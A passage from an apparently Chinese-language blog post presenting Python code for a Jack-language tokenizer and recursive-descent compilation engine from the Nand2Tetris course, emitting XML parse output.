class="comment"># we will skip the comment &quot;//&quot;</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos:pos+<span class="number">2</span>] == <span class="string">&quot;//&quot;</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># we will skip the comment &quot;/* .. */&quot;</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos:pos+<span class="number">2</span>] == <span class="string">&quot;/*&quot;</span>:</span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos:pos+<span class="number">2</span>] != <span class="string">&quot;*/&quot;</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                pos += <span class="number">2</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">          </span><br><span class="line">            <span class="comment"># check curr token is symbol</span></span><br><span class="line">            <span class="keyword">if</span> self.buffer[pos] <span class="keyword">in</span> symboldict:</span><br><span class="line">                self.tokens.append(self.buffer[pos:pos+<span class="number">1</span>])</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># check string constant</span></span><br><span class="line">            <span class="keyword">if</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                posCurr = pos</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                    pos += <span class="number">1</span></span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">                self.tokens.append(self.buffer[posCurr:pos])</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># check curr token </span></span><br><span class="line">            posCurr = pos</span><br><span class="line">            <span class="keyword">while</span> pos &lt; self.end <span class="keyword">and</span> self.buffer[pos] != <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> \</span><br><span class="line">                  self.buffer[pos] != <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> self.buffer[pos] <span class="keyword">not</span> <span class="keyword">in</span> symboldict:</span><br><span class="line">                pos += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> pos &gt; posCurr:</span><br><span class="line">                self.tokens.append(self.buffer[posCurr:pos])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hasMoreTokens</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.curr &gt;= <span class="built_in">len</span>(self.tokens) - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">advance</span>(<span class="params">self</span>):</span><br><span class="line">        self.curr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">currToken</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tokenType</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.getType(self.tokens[self.curr])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getType</span>(<span class="params">self,token</span>):</span><br><span class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> keworddict:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_KEYWORD</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(token) == <span class="number">1</span> <span class="keyword">and</span> token[<span class="number">0</span>] <span class="keyword">in</span> symboldict:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_SYMBOL</span><br><span class="line">        <span class="keyword">elif</span> validNum(token):</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_INT_CONST</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(token) &gt; <span class="number">1</span> <span class="keyword">and</span> token[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> token[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_STRING_CONST</span><br><span class="line">        <span class="keyword">elif</span> validIdentifiers(token):</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_IDENTIFIER</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> TOKEN_TYPE.TOKEN_INVALID</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">keyWord</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">symbol</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">identifier</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">intVal</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stringVal</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.tokens[self.curr][<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">genToken</span>(<span class="params">self</span>):</span><br><span class="line">        out =  <span class="built_in">open</span>(self.outfile,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">        out.write(<span class="string">&quot;&lt;tokens&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> token <span class="keyword">in</span> self.tokens:</span><br><span class="line">            t = self.getType(token)</span><br><span class="line">            <span class="keyword">if</span> t == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">                out.write(<span class="string">&quot;&lt;keyword&gt; &quot;</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">&quot; &lt;/keyword&gt;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                out.write(<span class="string">&quot;&lt;symbol&gt; &quot;</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">&quot; &lt;/symbol&gt;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">                out.write(<span class="string">&quot;&lt;integerConstant&gt; &quot;</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">&quot; &lt;/integerConstant&gt;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">                out.write(<span class="string">&quot;&lt;stringConstant&gt; &quot;</span>)</span><br><span class="line">                out.write(token[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">                out.write(<span class="string">&quot; &lt;/stringConstant&gt;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> t == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                out.write(<span class="string">&quot;&lt;identifier&gt; &quot;</span>)</span><br><span class="line">                out.write(token)</span><br><span class="line">                out.write(<span class="string">&quot; &lt;/identifier&gt;\n&quot;</span>)</span><br><span class="line">        out.write(<span class="string">&quot;&lt;/tokens&gt;\n&quot;</span>)</span><br><span class="line">        out.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    parser = JackTokenizer(<span class="built_in">input</span>)</span><br><span class="line">    parser.genToken()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li>
<li><code>compile engine</code>：整个的语法解析器还是非常复杂的，但是实际实现的<code>project</code>可以根据配套的<code>《The Elements of Computing Systems》</code>中的提示，可以很快的将代码解析为几个关键函数的实现即可。<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> JackTokenizer <span class="keyword">import</span> JackTokenizer,TOKEN_TYPE,KEYWORD_TYPE,tokentype,tokendict</span><br><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CompilationEngine</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,infile</span>):</span><br><span class="line">        <span class="comment"># read all source code string to the buffer</span></span><br><span class="line">        self.parser = JackTokenizer(infile)</span><br><span class="line">        outfile = infile[:infile.find(<span class="string">&quot;.jack&quot;</span>)] + <span class="string">&quot;.xml&quot;</span></span><br><span class="line">        self.out = <span class="built_in">open</span>(outfile,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">        self.depth = <span class="number">0</span></span><br><span class="line">        self.compileClass()</span><br><span class="line">        self.out.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lowerLevel</span>(<span class="params">self</span>):</span><br><span class="line">        self.depth += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upperLevel</span>(<span class="params">self</span>):</span><br><span class="line">        self.depth -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileOut</span>(<span class="params">self,<span class="built_in">str</span></span>):</span><br><span class="line">        self.out.write(<span class="string">&quot;  &quot;</span>*self.depth)</span><br><span class="line">        self.out.write(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileOutElement</span>(<span class="params">self,tkType,tkStr</span>):</span><br><span class="line">        self.out.write(<span class="string">&quot;  &quot;</span>*self.depth)</span><br><span class="line">        typeStr = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> tkType == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            typeStr = <span class="string">&quot;keyword&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            typeStr = <span class="string">&quot;symbol&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            typeStr = <span class="string">&quot;identifier&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            typeStr = <span class="string">&quot;integerConstant&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            typeStr = <span class="string">&quot;stringConstant&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> tkType == TOKEN_TYPE.TOKEN_INVALID:</span><br><span class="line">            typeStr = <span class="string">&quot;invalid&quot;</span></span><br><span class="line">        self.out.write(<span class="string">&quot;&lt;&quot;</span> + typeStr + <span class="string">&quot;&gt; &quot;</span> + tkStr + <span class="string">&quot; &lt;/&quot;</span> + typeStr + <span class="string">&quot;&gt;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileClass</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;class&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse class</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;class&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid class define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse class name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid class define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse symbol &#x27;&#123;&#x27; </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&#123;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid class define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#parse class val des</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">              (self.parser.keyWord() == <span class="string">&quot;static&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;field&quot;</span>):</span><br><span class="line">            self.compileClassVarDec()</span><br><span class="line">            </span><br><span class="line">        <span class="comment">#parse class method</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">            (self.parser.keyWord() == <span class="string">&quot;method&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;constructor&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;function&quot;</span>):</span><br><span class="line">            self.compileSubroutine()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#parse symbol &#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid class define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of parse class</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/class&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span>          </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileClassVarDec</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;classVarDec&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">          (self.parser.keyWord() == <span class="string">&quot;static&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;field&quot;</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse val type</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">or</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse val name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the left val name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">&quot;;&quot;</span>):</span><br><span class="line">            <span class="comment"># parse symbol &#x27;,&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;,&quot;</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse val name</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;valid val define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of class var descrtion</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/classVarDec&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileSubroutine</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;subroutineDec&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.keyWord() == <span class="string">&quot;constructor&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;function&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;method&quot;</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;invalid subroutine!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse type</span></span><br><span class="line">        <span class="keyword">if</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD  <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.keyWord() == <span class="string">&quot;int&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;char&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;void&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.keyWord() == <span class="string">&quot;boolean&quot;</span>)) <span class="keyword">or</span> \</span><br><span class="line">            self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">           <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">           <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;invalid subroutine!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse subroutineName</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;invalid subroutine!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse &#x27;(&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;(&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;invalid subroutine!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse param list</span></span><br><span class="line">        self.compileParameterList()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;)&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">&quot;)&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(sys._getframe().f_lineno) + <span class="string">&quot;invalid subroutine!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse body</span></span><br><span class="line">        self.compileSubroutineBody()</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/subroutineDec&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileSubroutineBody</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;subroutineBody&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;&#123;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;&#123;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid sub routine body define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var </span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">&quot;var&quot;</span>:</span><br><span class="line">            self.compileVarDec()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse &#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;inValid sub routine body define!\n&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;/subroutineBody&gt;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">compileParameterList</span>(<span class="params">self</span>):</span><br><span class="line">        self.compileOut(<span class="string">&quot;&lt;parameterList&gt;\n&quot;</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse rest param</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span>\</span><br><span class="line">            self.parser.symbol() == <span class="string">&quot;)&quot;</span>):</span><br><span class="line">            <span class="comment"># parse first element type</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER <span class="keyword">or</span> \</span><br><span class="line">               (self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">               (self.parser.keyWord() == <span class="string">&quot;int&quot;</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">&quot;char&quot;</span> <span class="keyword">or</span> \</span><br><span class="line">                self.parser.keyWord() == <span class="string">&quot;boolean&quot;</span>)):</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse first element varName</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse 